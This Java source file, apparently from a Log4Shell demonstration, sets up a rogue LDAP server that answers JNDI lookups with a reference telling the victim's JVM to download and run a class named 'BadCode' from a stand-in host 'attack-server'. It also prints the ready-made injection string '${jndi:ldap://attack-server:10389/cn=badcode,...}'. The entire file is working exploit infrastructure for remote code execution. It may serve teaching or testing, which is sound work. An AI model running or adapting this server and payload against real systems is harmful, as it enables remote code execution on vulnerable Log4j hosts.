package de.predic8;

import java.net.InetAddress;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import com.unboundid.ldap.listener.*;
import com.unboundid.ldap.sdk.*;

public class LdapServer {
    private static final String DEFAULT_HOST = "0.0.0.0";
    private static final int DEFAULT_LDAP_PORT = 10389;
    private static final String DEFAULT_CODEBASE_HOST = "attack-server";
    private static final int DEFAULT_CODEBASE_PORT = 8080;

    public static void main(String[] args) throws Exception {
        // Get values from environment variables or use defaults
        String ldapHost = System.getenv().getOrDefault("LDAP_HOST", DEFAULT_HOST);
        int ldapPort = Integer.parseInt(System.getenv().getOrDefault("LDAP_PORT", String.valueOf(DEFAULT_LDAP_PORT)));
        String codebaseHost = System.getenv().getOrDefault("CODEBASE_HOST", DEFAULT_CODEBASE_HOST);
        int codebasePort = Integer.parseInt(System.getenv().getOrDefault("CODEBASE_PORT", String.valueOf(DEFAULT_CODEBASE_PORT)));

        // LDAP server configuration
        InMemoryDirectoryServerConfig serverConfig = new InMemoryDirectoryServerConfig("dc=predic8,dc=de");

        InMemoryListenerConfig listenerConfig = new InMemoryListenerConfig(
                "listener",
                InetAddress.getByName(ldapHost),
                ldapPort,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault());

        serverConfig.setListenerConfigs(listenerConfig);
        serverConfig.setSchema(null);
        serverConfig.setEnforceSingleStructuralObjectClass(false);
        serverConfig.setEnforceAttributeSyntaxCompliance(true);

        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(serverConfig);

        // Base DN entry
        {
            DN dn = new DN("dc=predic8,dc=de");
            Entry e = new Entry(dn);
            e.addAttribute("objectClass", "top", "domain", "extensibleObject");
            e.addAttribute("dc", "predic8");
            ds.add(e);
        }

        // BadCode reference entry
        {
            DN dn = new DN("cn=badcode,dc=predic8,dc=de");
            Entry e = new Entry(dn);
            e.addAttribute("objectClass", "top", "domain", "extensibleObject", "javaNamingReference");
            e.addAttribute("cn", "badcode");
            e.addAttribute("javaClassName", "BadCode");
            String codeBaseUrl = String.format("http://%s:%d/", codebaseHost, codebasePort);
            e.addAttribute("javaCodeBase", codeBaseUrl);
            e.addAttribute("javaFactory", "BadCode");
            ds.add(e);
        }

        // Start the server
        ds.startListening();

        // Print server information
        System.out.printf("LDAP Server started on %s:%d%n", ldapHost, ldapPort);
        System.out.printf("Configured to fetch code from %s:%d%n", codebaseHost, codebasePort);
        System.out.println("Use: ${jndi:ldap://attack-server:10389/cn=badcode,dc=predic8,dc=de}");
    }
}
